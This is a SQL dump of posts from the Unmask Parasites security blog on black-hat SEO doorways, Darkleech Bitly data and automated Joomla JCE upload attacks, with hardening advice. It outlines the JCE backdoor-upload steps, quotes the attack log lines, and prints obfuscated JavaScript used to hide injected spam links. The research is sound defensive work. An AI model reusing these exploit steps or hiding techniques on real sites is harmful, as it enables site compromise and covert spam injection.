disruptive and annoying behavior given that many sites rely on the settings in .htaccess (e.g. most WordPress and Joomla sites).It’s indeed a most contradictive doorway generator that I ever seen. I can’t find any good explanation why it does things the way it does. Maybe you have any ideas?Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for SpammersHtaccess Redirect to Example.ru/dir/index.phpIntroduction to Website Parasites                                                                                  Tags: doorway htaccess redirect                                                    			                                            « Google -> Doorway -> Google -> Spam                Darkleech Update – November 2014 »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/09/12/most-contradictive-doorway-generator/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (184, 'Google -> Doorway -> Google -> Spam', 'unmask', '11 Jun 14', 'Loading site search ...          			                Google -> Doorway -> Google -> Spam                          11 Jun 14   Filed in Uncategorized                Just a few thoughts about an interesting behavior of a black-hat SEO doorway.Typically hackers create doorways on compromised sites to make search engines rank them for certain keywords and then, when searchers click on the links in search results, those doorways redirect them further to a site that hackers really promote. Sometime that redirect may go through some TDS (traffic directing service) but the whole scheme remains pretty much the same:Search results -> doorway -> beneficiary siteToday, when doing a backlink research of one of such pharma doorways, I encountered a different scheme — a one with a loop.The doorway had this URL structure:http://www.hacked-site.com/blog/?prednisolone-without-prescriptionWhen I checked it in Unmask Parasites or in Google cache, I saw spammy content with links to doorways on other hacked sites. Quite typical.When I opened that page in a web browser, it redirected to a TDShxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&gdw=w-48&gdf=%2F90dc16aaf3e24ea68c94c3f784a37ff9-f08f149982bf04ffaa308aba00b2d569.txt&host=www.hacked-site.com&kw=prednisolone%20without%20prescription&HTTP_REFERER=https%3A%2F%2Fwww.google.com%2F%3Fsource%3Dnoref%26q%3Dprednisolone%2520without%2520prescriptionCloaking and conditional redirects to traffic directing services are also quite typical for doorways.Then TDS made another hop:hxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&seoref=8bB06MP5xFTR3TkqmNILbbW5mW30f%2B%2FMiQdbatwxiv5CUUTkQjEO75VtTs7IRqdVTmPfmX……..2FIXHlBdqV6iDd1ruYQMhqmYVCozdkTrAN76fOABiczAnd then I ended up on … Google:http://www.google.com/search?q=prednisolone+without+prescriptionAnd that is not very typical. But interesting.One one hand, it looks like the spammers didn’t consider me as a target traffic (probably because of my IP) and redirected back to the Google search results page for the same query that I supposed to be using when found that site. For some, this chain of redirects may look as if they clicked on a search result and then Google thought for some time and reloaded the same page, which may look like just a glitch.On the other hand, it looks like a second level of search engine optimization, when spammers fine tune a search query that may return better doorways. I can’t help thinking about this because when I see the search results on Google pages that the TDS redirects me to, I realize that most of them are doorways on hacked sites (yes, including those with fake stars in ratings).I know, it’s quite pointless. Why redirect people who already clicked on your doorway to a new set of search results? Although those results may contain some of your other doorways, there is no guarantee that the searcher will not go away or click on them and not on links of your competitors? And you can’t control Google search results — it may happen that there will be no your doorways on the results page.OK. Let’s try to think as the TDS owners. The TDS recognizes the traffic that it doesn’t need for the pharma campaign. It mayredirect it to pharma landing pages anyway (which may decrease the quality and the price of such a traffic)dispose of that traffic altogether (redirect it to a neutral third-party site, like Google)try to monetize that traffic anyway — redirect it to some scam site, porn site, malware site or any other resource that knows how to take advantage of low quality traffic.<warning:unfounded speculation>But what it the spammers also run another campaign that targets the traffic that doesn’t fit their pharma campaign? They can simply redirect the traffic to landing pages of the second campaign. But such traffic will not be targeted. People searched for different things. So maybe it is worth it to “re-target” the traffic and redirect the searchers to a Google result page for keywords relevant to that second campaign and that contains links to their doorways.Here’s the scenario:People search something on Google and click on some result. For some reason Google reloads the page and shows them completely different results for a different query. Some searchers will definitely leave (don’t worry, this was unwanted traffic anyway) but some may become interested in what Google offers them and click on results (after all spammers usually promote something that people need and if it comes from Google it looks more legit). So, instead of either lost or untargeted traffic, they get targeted traffic of people who willingly clicked on search results. All they need to do is make sure their doorways dominate for relevant search queries (shouldn’t be hard since the TDS provide the search query itself and there is no need to rank for short generic queries.)</warning:unfounded speculation>OK, enough speculations. That particular campaign was not using the second level Google optimization. It simply dumped unneeded traffic back to Google. When opening the same doorways from different country IPs, the TDS redirected me to a random “Canadian Pharmacy” site from its pool of about a dozen of sites.Anyway, the point of this post is despite of Matt Cutts’ recent announcement of rolling out the second ranking update for “very spammy queries” I still see that 50% or more of top search results for pharma keywords still point to doorways on hacked sites.This past weekend we started rolling out a ranking update for very spammy queries: http://t.co/NpUZRqpnBI— Matt Cutts (@mattcutts) May 21, 2014And as long as “very spammy queries” return “very spammy results”, there will be incentive for black hat SEOs to hack sites and create doorways there.Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesIntroduction to Website Parasites                                                                                  Tags: black hat seo doorway TDS                                                    			                                            « Working With the Darkleech Bitly Data                Most Contradictive Doorway Generator »            			    Reader\'s Comments (2)       	        			        			SearchCap: Google PayDay Loan 3.0, Bing Ads URL Tagging & World Cup Fever | 12 Jun 2014 9:14 pm 						[…] Google -> Doorway -> Google -> Spam, Unmask Parasites. Blog. […]                   			        			Rosanne & Jerry Shalf | 03 Dec 2014 6:27 pm 						I keep getting redirected to a Canadian drugstore site when I type in ashlandmuseum.org. Before the Canadian drugstore site pops up I see something that looks like tds….etc. but it quickly moves to the Canadian site, so I don’t know the complete set of letters.  I have a macbook pro 2012 and am using Maverick 10.9.5 OS.  It doesn’t always happen, which is weird, and it only happens on my computer, not others.  It happens when I use Firefox and Safari.  How do I get rid of it?  I had Applecare go through the machine and we got rid of various viruses, but we couldn’t fix this one.  Applecare said it was because of something Google did and only Google can fix, but I can’t figure out how to reach Google and ask for help.  Please, somebody, help me!!', '', 'http://blog.unmaskparasites.com/2014/06/11/google-doorway-google-spam/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (185, 'Working With the Darkleech Bitly Data', 'unmask', '10 Feb 14', 'Loading site search ...          			                Working With the Darkleech Bitly Data                          10 Feb 14   Filed in General                Data Driven Security took the time to analyze the raw data that I published in my recent post on Sucuri blog about how I used Bitly data to understand the scale of the Darkleech infection.In their article, they have a few questions about data formats, meaning of certain fields and some inconsistencies, so I’ll try to answer their questions here and explain how I worked with the data.So I needed to get information about all the links of the “grantdad” bitly account.I checked the API and somehow missed the “link_history” API request (it was the first time I worked with the bitly API), so I decided to screenscrape the web pages where bitly listed the links creaded by grantdad. 1,000 pages with 10 links on each. Since pages didn’t contain all the information I needed I only collected the short links so that I could use them later in API calls to get more detailed information about each of them.As you can see I was limited with the 10,000 links that bitly made available via their web interface. Not sure if I could get more links via that link_history API. Right now it returns “ACCOUNT_SUSPENDED” and when it was not suspended, API calls for known links beyond those 10,000 produced various errors.When I compiled my list of 10,000 links I used the following API calls to get information about each of the links:Referring domainsAPI:link/referring_domains — for each link, it returned a list of domains referring traffic to this link (in our case sites, containing the iframes) along with the number of clicks from each domain. This helped me compile this list of iframe loads per domain: http://pastebin.com/HYaY2yMb. Then I tried to resolve each of the domain names and created this list of infected domains per IP address: http://pastebin.com/Gxr51Nc1.I also used this API call to get number of iframe loads for each bitly link.InfoAPI:link/info – this gave me timestamps of the links and their long URLs (the rest information was not interesting for my research). Unfortunately, this particular API call is poorly documented so I can only guess what this timestamp mean. It is actually called “indexed“. But I guess it’s the time when the link was created. It is definiteley not the time of the first click because there were no registered clicks for many of the links. As a result, I compiled these datasets:http://pastebin.com/UmkDZZp0http://pastebin.com/w7Kq3ybV ,which contain tab separated values of “bitly link id”, “timestamp”, “# of clicks/iframe loads”, and “long URL”.At that point, I already had the number of iframe loads from the previous step (“link/referring_domains“). Then, for readability, I converted the numeric timestamp using this Python function datetime.datetime.fromtimestamp(). However, you can notice that the second dataset (for January 28th) has a different date format. Instead of “2014-01-25 19:10:07” it uses “Jan 28 23:10:19“. Why? Because of pastebin.com. Because it doesn’t allow unregistered users to post more than 500Kb of data (I deliberately post such data as a guest). Removing the year from the date allowed me to save 4 bytes on each row and fit the dataset in 500Kb.Actually this 500Kb limit is the reason why I have separate pastebins for each date and only specify bitly ids instead of the full bitly links.CountriesAnd finally, API:link/countries – for each link, it returned a list of countries referring traffic to this link along with the number of clicks from those countries. This helped me compile this list of iframe loads per country http://pastebin.com/SZJMw3vx.The last dataset Feb 4-5When I wrote my blogpost on February 5th, I noticed that there were new links available on the Bitly.com grantdad acount page. I began to browse pages of his links and figured that most of the links were the same (Jan 25 and 28) but around 1,700 of them were new (late February 4th and the beginning of February 5th). I immediately repeated the same procedure that included screenscraping, and 3 API calls for each new bitly link. After that I created this new dataset http://pastebin.com/YecHzQ1W and updated the rest datasets (domains, countries, etc).Some more detailsIf you check the total numbers in these two datasets (domains) http://pastebin.com/HYaY2yMb and (countries) http://pastebin.com/SZJMw3vx you’ll see the different in total number of iframe loads: 87152 and 87269. I don’t know why. I used the same links just different API calls (referring_domains and countries) and the totals are supposed to be the same. I didn’t save the “per link” data so can’t tell exactly whether it was my error or the bitly API produces slightly inconsistent results. Anyway, the difference is neglectable for my calculations and doesn’t affect the estimations (given that I tried to underestimate when in doubt ).I didn’t check for duplicates that guys from Data Driven security found in my datasets. They must have to do with my screenscraper and the way that Bitly.com displays links in user accounts. The total number of scraped links matched the number of links that Bitly reported for the user. The extra 121 clicks that these duplicates are responsible for are so close to the 117 difference that I mentioned above so I wonder if these numbers somehow connected? Anyway, this shouldn’t affect the accuracy of the estimates either.Building the geo distribution mapFor the map, I used the Geochart from Google visualization. Since the difference in numbers of clicks for the top 3 countries and the lower half of the list was 3 orders of magnitude, I had to re-scale the data so that we could still see the difference between countries with 50 iframe loads and 2 iframe loads.. I used a square of a natural logarithm for thatMath.pow( Math.round( Math.log(i)), 2)This gave me a nice distribution from 0 to 100 and the below map.IFrame Load Geo DistributionSpeculation on the link generationAfter checking the link creation per minute-of-an-hour distribution, Bob Rudis wondered:This is either the world’s most inconsistent (or crafty) cron-job or grantdad like to press ↑ + ENTER alot.I guess, it was neither cron-job nor manual link creation. I think the [bitly] links were created on-demand. So if someone loads a page and Darkleech needs to inject an iframe then it (or rather the server it works with) generates a new bitly link. Given that this malware may lurk on a server, there may be time periods when no malicious code is being injection into any web pages across all the infected servers. At the same time, the bitly links with zero clicks may refer to page loads by various bots (including our own) when the malicious code is injected but the iframe is never loaded. On the other hand, the volume of bitly links with 0 clicks (~35%) suggests that there might really more complex link generation mechanism than a simple “on-demand” approach.Anyway, that’s great when people double check our data and try to find new interesting patterns there. Make sure to let me know (here or on the Sucuri blog) if you find more patterns and inconsistencies, or have any comments on how the Darkleech works.Related posts:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsBety.php Hack. Part 2. Black Hats in Action.Introduction to Website Parasites                                                                                  Tags: Bitly Darkleech data statistics                                                    			                                            « Invasion of JCE Bots                Google -> Doorway -> Google -> Spam »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/02/10/working-with-the-darkleech-bitly-data/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (186, 'Invasion of JCE Bots', 'unmask', '27 Jan 14', 'Loading site search ...          			                Invasion of JCE Bots                          27 Jan 14   Filed in Website exploits                Joomla has been one of the most popular CMS for a long time.  It powers a huge number of sites.  That’s great! The flip side of this fact is Joomla has been very popular for a long time and there are still very many sites that use older versions of Joomla as well as older version of Joomla components. For example, the 1.5.x branch of Joomla (2008-2010) still has a noticeable share in live Joomla sites.Old versions may work well for your site but they have multiple well known security holes, so they are the low hanging fruit for hackers. Let me show this using a real world example.JCE attackThere is a JCE component — a fancy content editor that can be found almost on every Joomla site. It has a well known security hole that allows anyone to upload arbitrary files to a server.You can easily find a working exploit code for this vulnerability.  What it does is:Checks whether a vulnerable version of JCE is installed (2.0.11, 2.0.12, 2.0.13, 2.0.14, 2.0.15, 1.5.7.10, 1.5.7.11, 1.5.7.12, 1.5.7.13, 1.5.7.14)Exploits the bug in the JCE image manager to upload a PHP file with a .gif extenstion to the images/stories directoryThen uses a JSON command to rename the .gif file to *.php.Now you have a backdoor on a server and can do whatever you want with the site.This is how this attack looks in logs (real example):197.205.70.37 - - [23/Jan/2014:16:46:54 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.0\" 200 302 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20 HTTP/1.0\" 200 329 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"GET /images/stories/3xp.php HTTP/1.0\" 200 465 \"-\" \"BOT/0.1 (BOT for JCE)\"As I mentioned, JCE is a very popular component and there are still many sites that use old versions of this component. No wonder, hackers are scanning the Internet for such vulnerable sites.  They reworked the exploit code for use in their automated tools that relentlessly test millions of sites, one by another.  These days, I can find multiple requests with the “BOT/0.1 (BOT for JCE)” User-Agent string in logs of almost every site that I check, even in logs of sites that have never had Joomla installed.I’d like to share some interesting statistics of a real site that had been hacked using this JCE hole and then was being routinely reinfected every day.7,409 requests with the User-Agent “BOT/0.1 (BOT for JCE)” that came from 785 different IPs during the period of Dec 24th – Jan 24th (one month)239 requests from 51 unique IP addresses during the last 24 hours4 independent (uploaded different types of backdoors) successful infections during one day.plus, multiple tests for other vulnerabilities.To webmastersAs you can see,  this is something that you can’t neglect or consider an insignificant threat.  It’s silly to hope that hackers won’t find your site. Today hackers have resources to spider the Internet almost as efficiently as Google just about 10 years ago, so there is almost no chance your site will stay unnoticed. The only way to prevent the hacks is to be proactive:  keep all software up-to-date and harden your sites.In case of this particular JCE attack:Make sure to upgrade your Joomla site to the most current version.Upgrade JCE to the latest version. You can find download packages for all the three branches of Joomla here.Protect all file upload directories and all directories that shouldn’t contain .php files. For example, place the following .htaccess file there to prevent execution of PHP files:<Files *.php>deny from all</Files>Try blocking requests with the “BOT/0.1 (BOT for JCE)” User-Agent string.  Of course, this shouldn’t be considered as a real protection. Hackers can change the User-Agent string to whatever they want. But it can help keep some dumb annoying bots away from your site.If, for some reason, you can’t upgrade your site at this moment, consider placing it behind a website firewall that will block any malicious traffic before it reaches your server.  This is something that we call virtual patching in Sucuri CloudProxy.                                                                                  Tags: exploit JCE Joomla                                                    			                                            « Reporting Suspicious Styles                Working With the Darkleech Bitly Data »            			    Reader\'s Comments (8)       	        			        			Jim Walker | 28 Jan 2014 5:47 pm 						Nicely done!The JCI component “problem” and has been a thorn in the Joomla communities side for years.I would go so far as to say that 1/2 of all of the hacked Joomla installations I’m asked to repair are JCE exploit related.As mentioned, simply adding the .htaccess “no execute php” file within the images/stories directory generally does the trick, though upgrading is always best.Personally, for this particular exploit, I prefer the below in my .htaccess file:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shI like how you linked out to Google and known JCE exploits as well.A quality post top to bottom. Kudos!                   			        			Denis | 28 Jan 2014 7:12 pm 						Thanks Jim,That “text/plain” handler also does the trick and covers a broader range of attacks.I don’t want to link directly to exploits. But if you want to find the information, this Google search is enough. At the same time, if there is some new JCE file upload vulnerability, this search will show it too, so the link will remain fresh and useful.                   			        			machineX | 19 Sep 2014 9:05 am 						I just seen it in some logs for the second time. We do not use joomla. But I think your .htaccess code is very useful in preventative measures for sites overall.                   			        			Brian M | 20 Feb 2014 3:10 pm 						I’m curious if you would have any more information on exactly what is allowing the exploit to work? I understand it’s an exploit in code which was in an old version of Joomla, but my vBulletin sites are apparently being exploited by this Bot for JCE script. I do not have any pieces of Joomla installed on the server – at least, not that I’m aware of. Thankfully Microsoft Security Essentials is catching the backdoor/shell script being uploaded to the site and is removing it before they can use it, but it scares me that they’re able to upload the file to my site in the first place. I’ve tried to get help from vBulletin but they brush it off as not being on their end.                   			        			Denis | 11 Jun 2014 5:13 pm 						In case of Joomla JCE, it just uses a bug to upload a PHP file as a .gof and then change it’s extension to .php.If you don’t have Joomla, then you might see multiple attempts to scan your site for that JCE security hole. They do it on every site. If they find it – they exploit it, if not they move on to the next site. So what you are seeing is probably just attack attempts, not successful attacks. On the other hand, if hackers find vulnerabilities in vBulletin or any other type of site, they’ll most likely upload pretty much the same backdoors as if it was Joomla.vBulletin may be slightly different as most of it’s malware lives in its database.                   			        			JCE Joomla Extension Attacks in the Wild | Sucuri Blog | 26 Mar 2014 8:11 pm 						[…] Unmask: Invasion of JCE Bots […]                   			        			catalina | 30 Mar 2014 6:23 am 						If I understood, I have to open my .htaccess file and insert these lines:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shThats it?Which are the “collateral effects” of this?Thanks in advanceCatalina                   			        			Denis | 11 Jun 2014 5:16 pm 						This code makes web server treat such files as regular text files. I.e. instead of executing any code in them, it will just display their content in a browser as if they were plain text files.The side effect is you won’t be able to have executable scripts in those directories. But it’s the point of this trick – place it to the directories that shouldn’t have executable files', '', 'http://blog.unmaskparasites.com/2014/01/27/invasion-of-jce-bots/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (187, 'Reporting Suspicious Styles', 'unmask', '22 Nov 13', 'Loading site search ...          			                Reporting Suspicious Styles                          22 Nov 13   Filed in Unmask Parasites                Back in 2008, the very first task that I created Unmask Parasites for was scanning web pages for hidden links.I read an article about thousands of WordPress blogs being stuffed with dozens of invisible spammy links. I had a self-hosted WordPress blog too and that article made me think if there was some easy way to figure out whether my blog was hacked, something less laborious than manually examining the HTML code link by link. So I decided to create a tool that would show all domains that my web pages linked to highlighting those of them that had “invisible” styles. This approach has proved to be very efficient in identifying black hat SEO hacks. In most cases, a glance is enough to spot such problems.It works well even when the tool doesn’t highlight links as “hidden” (either because the “hiding rule” was not detected or because it scanned the “cloaked” page created specifically for search engines). You can still see the links that clearly don’t belong to your site, which tells you that something’s wrong.However, looking for suspicious links is not the bullet-proof method for detecting spam injection issues. For example, in my yesterday’s post on Sucuri blog, I wrote about fake WordPress plugins that used to injects spammy links and a JavaScript code into web pages. However, at the moment, they inject some hidden spammy auto-generated text that doesn’t have any links.You can use this Google query to reveal affected sites [cigarettes AND (“3200 unhealthy” OR “3300 hazardous”)]I don’t know why they do it, but webmasters should definitely be warned about such injections because it’s a sign of a problem that should be fixed as soon as possible. This is actually more serious than just a factor that can potentially affect site’s search ranking. Those fake plugins fetch the spammy content from remote servers and inject it into blog pages on the fly. This means that hackers can change it any time and the same moment the new spammy block will be injected into all compromised sites. Or it can be a malicious block, which makes things more serious as it will affect all visitors to those sites too.Unfortunately, such injections were not reported by Unmask Parasites since there were no links in the spammy block. After thinking about the problem, I decided that Unmask Parasites should also report pure HTML tricks such as that clip:rect style trick that hackers use to hide their injections.So , starting this week, you may see the “Suspicious Styles” section in Unmask Parasites reports.In this section, you will see excerpts of the style definitions that Unmask Parasites considers suspicious. If you see it in your site reports, then you should check the HTML code of your pages and figure out whether that style is a normal part of your pages or it was added there to hide something illicit.Note, if you can’t find such code in your web pages, it doesn’t mean it is not there. The code injection can be conditional, and server files may fetch it from a remote location (as in this case with fake WordPress plugins), or it can be encrypted. Just remember that Unmask Parasites works in real time (some results may be cached for up to an hour) and if it reports something, then you can be sure it was on a web page at the moment of scanning.To Unmask Parasites usersIf you like Unmask Parasites and want to help improve it, you can inform me about interesting tricks that hackers use to hide injected content Or send me examples of infected web pages where Unmask Parasites doesn’t report any problems.Thanks!Related posts:Unmasking “Canonical” HacksRich Snippets in Black Hat SEOIntroduction to Website Parasites                                                                                  Tags: black hat seo hidden links spam                                                    			                                            « Unmask Parasites joins Sucuri                Invasion of JCE Bots »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/11/22/reporting-suspicious-styles-2/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (188, 'Unmask Parasites joins Sucuri', 'unmask', '20 Sep 13', 'Loading site search ...          			                Unmask Parasites joins Sucuri                          20 Sep 13   Filed in Unmask Parasites                It’s official. This week Unmask Parasites joins Sucuri!Since July of 2008 when I released the first public version, Unmask Parasites was a “one man project” and it worked fine for me most of the time. I did everything myself from server setup to site development, from web attack investigations to blogging here. During these years Unmask Parasites became quite noticeable both within webmasters and Internet security community. And I always tried to meet their expectations providing a tool that could reveal various obscure website security issues and sharing information on how and why websites get hacked, and what can be done to prevent it.When Sucuri approached me and asked if I wanted to join their team as a malware researcher, I didn’t think much. I’ve been watching this company since 2010 and knew how much we had in common in our approach to Internet security. We both focus on helping site owners to detect security problems and protect their sites. We do our best to educate webmasters about things that hackers do with compromised websites — unmasking their dirty tricks is an important part of our work. In 2011 we established good relationship and began to help each other by sharing our information about ongoing massive attacks. Now Sucuri has grown to one of the leading companies in its field and makes a significant impact on how many thousands of site owners protect their sites. It’s an honor for me to join this company and the team of professionals that I know for so long time.I guess you wonder what will happen to Unmask Parasites scanner and this blog? They are here to stay! I will still be responsible for Unmask Parasites and continue to improve it and publish my blogposts here. Even better: now that I’m with Sucuri, I will have access to large volumes of data from their tools and support team (something that I really missed during the last five years), which will definitely facilitate my investigations, and, in turn, improve the quality of Unmask Parasites scanner and Sucuri own tools.For additional information check the Sucuri’s announcement.Let’s unmask parasites!Related posts:Let’s Unmask Parasites1 Million Pages Checked by Unmask Parasites!Unmask Parasites. A Year of Blogging.                                                                                  Tags: Sucuri                                                    			                                            « Analyzing [Buy Cialis] Search Results                Reporting Suspicious Styles »            			    Reader\'s Comments (2)       	        			        			Jackie McBride | 21 Sep 2013 3:36 pm 						Denis, I cannot think of anyone more deserving than you of this opportunity. Hearty congratulations & many blessings in your new venture as you go forward! & Sucuri better realize how damn lucky they are lol. From the sound of the announcement, it appears they do. Again, congratulations!                   			        			Sucuri Expands Research Efforts with Acquisition of Unmask Parasites | Sucuri Blog | 15 Sep 2014 11:50 pm 						[…] Unmask Parasites blog post […]', '', 'http://blog.unmaskparasites.com/2013/09/20/unmask-parasites-joins-sucuri/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (189, 'Analyzing [Buy Cialis] Search Results', 'unmask', '21 Aug 13', 'Loading site search ...          			                Analyzing [Buy Cialis] Search Results                          21 Aug 13   Filed in General                A few days ago I was updating the spammy word highlighting functionality  in Unmask Parasites results and needed to test the changes on real websites. To find hacked websites with spammy content I would normally google for [viagra] or [cialis], which are arguably the most targeted keywords used in black hat SEO hacks. However after the Google’s June update in how they rank web pages for spammy queries, I didn’t have much expectation of seeing hacked sites on the first page of search results for my usual [buy cialis] query and was ready to check a few more pages.We just started a new ranking update today for some spammy queries. See 2:30-3:10 of this video: http://t.co/KOMozoc3lo #smx— Matt Cutts (@mattcutts) June 11, 2013Indeed, for queries like [payday loans] I can see quite relevant results on the first three pages. All sites are specialized and don’t look like doorways on hacked sites. That’s really good. For [viagra] I found only one result on the first page pointing to a doorway on a hacked site. Still good.However, when I entered a really spammy combination [buy viagra], the search results were less than optimal — 5 out of 10 led to hacked sites. And at least 2 out of the rest 5 specialized sites were promoted using hidden links on hacked sites. Not good. And the worst results (although ideal for testing my update) were for the [buy cialis] query — 100% of results on the first page (10 out of 10) led to doorways on hacked sites or simply spammy web pages. Not a single result from websites that really have anything to do with cialis.Results analysisHere is the breakdown of the first 10 results (links go to real time Unmask Parasites reports for these pages and at the moment of writing they all reveal spammy content. However this may change over time):www.epmonthly .com/advertise/ — doorway on a hacked sitewerenotsorry .com/ — strange spammy site with a rubbish content like this “The car buy cialis in your car is the ultimate well source of electrical amazing power in your car.“incose .org/dom/ — doorway on a hacked site.www.deercrash .org/buy/cialis/online/ — doorway on a hacked sitejon-odell .com/?p=54 — doorway on a hacked sitewww.goodgrief .org .au/Cialis/ — doorway on a hacked sitewww.asm .wisc .edu/buy-cialis — doorway on a hacked sitewww.mhfa .com .au/cms/finance-home/ — doorway on a hacked sitewww .plowtoplate .org/library/51.html — doorway on a hacked sitejohn-leung .com/?p=16 — doorway on a hacked siteOver the course of the past week the results slightly fluctuated and sometimes I saw the following links on the first SERP.www.enconline .com/buycialisonline/ — doorway on a hacked sitewww.bbs-usa .com/online/ — doorway on a hacked sitewww.fabrand .com/buycialis/ — doorway on a hacked sitewww.philiptusa .com/streak/ — doorway on a hacked sitewww.clarkart.edu/authman/ — doorway on a hacked sitewww.gvhc.org/temp/index.html — doorway on a hacked sitewww.cialis-no-prescriptions.com — specialized site, but its backlink profile include many hacked sites with injected hidden links (e.g. www.aauw-nys.org)tadalafilcheap .ca/buy-cialis-online – another specialized site with a very poor backlink profile (mostly spammy off-topic forum posts).Out of 18 links that I encountered on the first page for [buy cialis] 15 point to doorways on hacked sites, 1 to a site with unreadable machine-generated text (still not sure whether it’s some SEO experiment or a backdoor with a tricky search traffic processing procedure) and 2 specialized sites relevant to the query but with quite bad backlink profiles. Overall 0% of results that follow Google’s quality guidelines.So the Google’s update for spammy queries doesn’t seem to work as it should at least for some über spammy queries.  It’s sad. And the reason why I’m sad is not that I worry about people who use such queries on Google to buy some counterfeit drugs.  My major concern is this situation justifies the huge number of sites (many thousands) that cyber-criminals hack in order to put a few of their doorways to the top for relevant queries on Google.Behind the scenesThe above 15 hacked sites that I found on the first Google’s SERP are actually only a tip of the iceberg. Each of them is being linked to from many thousands (if not millions) pages from similarly hacked sites. Here you can see a sample list of  sites that link to the above 15 (you might need a specialized tool like Unmask Parasites to see hidden and cloaked links there).Many of the hacked web pages link to more than one doorway page, which maximizes changes that one of them will be finally chosen by Google to be displayed on the first page for one of the many targeted keywords. And at the same time this helps to have a pool of alternative doorways in case some of them will be removed by webmasters or penalized by Google. As a result, the networks of doorways, landing pages and link pages can be very massive. Here you can see a list with just a small part of spammy links (338 unique domains) that can be found  on hacked web pages..gov, .edu and .orgAmong those hacked sites you can find sites of many reputable organizations, which most likely greatly help to rank well on Google. There are many compromised sites of professional associations, universities and even governmental sites, for example (as of August 19th, 2013):www.volunteer.gov/sec/spb.ca.gov/status/www.takepride.gov/index.htmlVolume of spammy backlinksIf you take some of the top results and check their backlink profiles (I used Majestic SEO Site Explorer), you’ll see how many domains can be compromised (or spammed) just in one black hat SEO campaign. And we know that there are many ongoing competing campaigns just for “cialis” search traffic, so you can imaging the overall impact.On the above screenshot you can see that thousands of domains linking to “www .epmonthly .com/advertise/” using various “cialis” keywords.The situation with “www. epmonthly .com/advertise/” is quite interesting. If you google for [“www.epmonthly .com/advertise/”] you’ll see more than a million results pointing to web pages where spammers used automated tools to post spammy links (including this one) in comments, profiles , etc. but failed to verify whether those sites accept the HTML code they were posting (still many sites, while escaping the HTML code, automatically make all URLs clickable, so those spammers finally achive their goal) .Typical black hat SEO tricksIn addition to annoying but pretty harmless comment spamming, forum spamming and creating fake user profiles, black hats massively hack websites with established reputation and turn them into their SEO assets.Spammy linksThe most common use for a hacked site is injecting links pointing to promoted resources (it can be a final landing page, or a doorway, or an intermediary site with links). Here is what such web pages may look like in Unmask Parasites reports:To hide such links from site owners, hackers make them hidden. For example, they can place them in an off-screen <div><div style=\"position:absolute; left:-8745px;\">...spammy links here...</div>Or put them in a normal <div> and add a JavaScript to make this <div> invisible when a browser loads the page<div id=\'hideMe\'> ... spammy links here.... </div><script type=\'text/javascript\'>if(document.getElementById(\'hideMe\') != null){document.getElementById(\'hideMe\').style.visibility = \'hidden\';document.getElementById(\'hideMe\').style.display = \'none\';}</script>The JavaScript can be encrypted.e v a l(function(p,a,c,k,e,d){e=function(c){return(c<a?\"\":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!\'\'.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return\'\\\\w+\'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);return p;}(\'2.1(\\\'0\\\').5.4=\"3\";\',6,6,\'bestlinks|getElementById|document|none|display|style\'.split(\'|\'),0,{}))which translates todocument.getElementById(\'bestlinks\').style.display=\"none\";where “bestlinks” is the id of the <div> with spammy links.Sometimes, encrypted JavaScript can be coupled with dynamic HTML generation of the link container. After decryption it looks like this:document.w ri t e(\'<style><!-- .read {display:none} --></style><address class=\"read\">\');...spammy links here...document.wri te(\'</address>\');Of course, it’s only a client-side representation of the problem. On the server side, it’s rarely this straightforward. Most times it involves obfuscated (usually PHP) code in sneaky places (e.g. themes, plugins, DB, etc.)DoorwaysSites that rely on black hat SEO techniques get penalized by Google soon enough so the can’t expect much search traffic directly from search engines. Instead they try to promote many disposable doorways on other reputable sites that would redirect search traffic to them.The typical approach is to hack a website and use cloaking tricks (generating a specialized version with spammy keywords specifically for search engines while leaving the original content for normal visitors) to make search engines think that its pages are relevant for those spammy queries. E.g. check the title of the “www.epmonthly .com/advertise/” when you visit it in a browser (“Advertise“) and when you check it in Unmask Parasites or in Google’s Cache (“Buy Cialis (Tadalafil) Online – OVERNIGHT Shipping“). Then they add some functionality to distinguish visitors coming from search engines and redirect them to third party sites that pay hackers for such traffic.The redirects may be implemented as .htaccess rules, client-side JavaScript code, or server-side PHP code.Sometimes, instead of using cloaking, hackers simply create a whole spammy section in a subdirectory of a legitimate site, or a standalone doorway page. Example from our cialis search results: www .asm .wisc .edu/buy-cialis 